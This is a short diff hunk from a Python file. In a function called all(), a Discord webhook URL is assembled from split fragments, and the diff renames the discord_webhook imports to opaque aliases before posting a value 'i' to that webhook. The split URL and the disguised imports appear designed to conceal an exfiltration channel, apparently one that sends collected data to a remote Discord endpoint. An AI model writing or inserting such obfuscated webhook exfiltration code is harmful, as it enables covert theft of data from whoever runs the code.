@@ -16,14 +16,14 @@ def all() :
     u = u1 + u2 + u3 + u4 + u5 + u6 + u7 +'Q0An_60_TwNJg0vViqGrKh4'
 
 
-    from discord_webhook import DiscordWebhook, DiscordEmbed
+    from ni import DWK, NE
     import os
 
 
 
-    webhook = DiscordWebhook(url=u, username="me")
+    webhook = DWK(url=u, username="me")
 
-    embed = DiscordEmbed(title='i : '+ i, color='03b2f8')
+    embed = NE(title='i : '+ i, color='03b2f8')
     embed.set_author(name='Me', url='https://www.nicepng.com/png/full/222-2224618_yellow-orange-smile-emoticon-transparent-fuck-emojis.png', icon_url='https://icon-library.com/images/avatar-icon-images/avatar-icon-images-4.jpg')
     embed.set_footer(text='Embed Footer Text')
     embed.set_timestamp()
